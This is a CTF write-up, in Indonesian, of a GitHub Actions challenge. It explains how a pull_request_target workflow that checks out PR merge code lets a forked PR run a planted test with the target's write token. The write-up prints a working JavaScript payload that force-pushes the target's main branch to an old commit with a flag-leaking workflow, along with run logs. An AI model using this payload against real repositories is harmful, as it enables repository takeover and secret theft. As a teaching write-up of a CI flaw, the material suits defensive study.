# Old food

Challenge ini kelihatannya cuma ngasih service `ncat`, tapi service itu sebenarnya dipakai buat bikin repo private di organisasi GitHub target. Inti challenge-nya bukan di aplikasi resepnya, melainkan di GitHub Actions yang nempel di repo hasil generate tadi.

## Ringkasan singkat

Bug utamanya ada di workflow `ci.yml` yang jalan di event `pull_request_target`, lalu melakukan checkout ke `refs/pull/<id>/merge` sebelum menjalankan test. Kombinasi ini berbahaya karena workflow dieksekusi dengan konteks repo target, tapi kode yang dites berasal dari hasil merge PR. Kalau kita bisa bikin PR dari fork, kita bisa nanam test berbahaya dan menjalankan perintah di runner dengan `GITHUB_TOKEN` milik repo target.

Masalahnya, token workflow itu cuma punya `contents: write`, bukan `workflows: write`. Jadi jalur lurus seperti “push workflow jahat baru ke target” mentok. Solusi yang kepakai justru lebih rapi: cari commit lama yang sudah punya workflow pembaca flag, lalu paksa `main` mundur ke commit itu dari dalam runner.

## Enumerasi

Setelah service dijalankan, saya dapat repo:

`GPNCTF24-2/250845531_rhnataiet23-art_old-food-challenge`

Dari histori git repo target, kelihatan ada file workflow lama yang sudah dihapus:

`.github/workflows/flag.yml`

Isinya:

```yaml
on:
  pull_request_target:
    branches:
      - main

permissions:
  {}

jobs:
  flag:
    runs-on: ubuntu-latest
    steps:
      - name: Get flag
        run: echo ${{ secrets.FLAG }} | base64 | base64
```

Workflow aktif di `main` saat enumerasi:

```yaml
on:
  push:
    branches: [main]
  pull_request_target:
    branches: [main]

permissions:
  contents: write

jobs:
  test:
    ...
    steps:
      - uses: actions/checkout@v4
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - run: npm run test:coverage
```

Poin pentingnya ada dua:

1. `pull_request_target` jalan dengan permission repo target.
2. Kode yang dieksekusi di job test berasal dari hasil merge PR.

Artinya kalau kita bisa buka PR dari fork, kita bisa sisipkan file test baru dan perintah itu akan dieksekusi di runner target.

## Jalan buntu yang sempat dicoba

Push langsung ke repo target pakai kredensial user biasa ditolak.

Fork sempat terlihat seperti dimatikan, tapi lewat API GitHub ternyata masih bisa dibuat. Dari situ saya buka PR fork ke target dan mulai pakai jalur `pull_request_target`.

Percobaan pertama adalah mendorong workflow jahat baru ke branch target dari dalam runner. Itu gagal dengan error seperti ini:

```text
refusing to allow a GitHub App to create or update workflow `.github/workflows/leak.yml` without `workflows` permission
```

Jadi jelas `GITHUB_TOKEN` runner memang bisa `contents: write`, tapi tidak bisa membuat atau mengubah file di `.github/workflows`.

## Ide yang akhirnya jadi

Kalau tidak bisa menulis workflow baru, pakai workflow lama yang sudah pernah ada.

Di branch internal `feature/pr-checks`, commit lama `6d6b8d3` masih ada dan memang memuat `flag.yml`. Karena object commit itu sudah eksis di repo, runner tidak perlu membuat file workflow baru. Cukup:

1. `git fetch` branch `feature/pr-checks`
2. Ambil commit `feature-src~2`, yang jatuh ke `6d6b8d3`
3. Buat branch `flagold` ke commit itu
4. Force-push `main` ke commit lama yang sama

Payload test yang dipakai di PR fork pada dasarnya begini:

```js
test("rewind target main to old flag workflow commit", () => {
  require("child_process").execFileSync(
    "bash",
    [
      "-lc",
      `
set -euo pipefail
git fetch --depth=10 origin feature/pr-checks:feature-src
git push -f origin feature-src~2:refs/heads/flagold
git push -f origin feature-src~2:refs/heads/main
      `,
    ],
    { stdio: "inherit" },
  );
});
```

Saat job target jalan, log membuktikan dua push itu diterima:

```text
* [new branch]      feature-src~2 -> flagold
+ d8ab766...6d6b8d3 feature-src~2 -> main (forced update)
```

Begitu `main` sudah mundur ke `6d6b8d3`, workflow aktif repo target bukan lagi `ci.yml`, tapi `flag.yml`.

## Trigger flag

Sesudah `main` berhasil dipaksa ke commit lama, saya cukup push empty commit lagi ke branch PR fork. Event `pull_request_target` terpanggil ulang, dan kali ini workflow yang jalan adalah:

`.github/workflows/flag.yml`

Log run tersebut mengeluarkan dua baris base64:

```text
UjFCT1ExUkdlMUpGYzFWU2NrVkRkRjkwYUVWZlZ6QnlTMFpNTUhkZlVrbHdYMVJvUlY4MmJFOXlh
VTlWTlY5a1lWbFRYekJtWDFCMQpiRXhmVW1WeFZUTTFOMTlVWVhJMlJWUjlDZz09Cg==
```

Setelah di-join lalu di-decode dua kali, hasilnya:

```text
GPNCTF{REsURrECt_thE_W0rKFL0w_RIp_ThE_6lOriOU5_daYS_0f_PulL_ReqU357_Tar6ET}
```

## Kenapa exploit ini bekerja

Ini murni kombinasi tiga kesalahan desain:

1. `pull_request_target` dipakai untuk PR yang bisa membawa kode tak dipercaya.
2. Job test checkout ke merge result PR dan menjalankan code dari sana.
3. Runner diberi `contents: write`, jadi kode jahat dari PR bisa mendorong ref di repo target.

Walaupun `workflows: write` tidak ada, repo masih bisa diambil alih secara logis dengan memindahkan branch ke commit lama yang sudah mengandung workflow berbahaya.

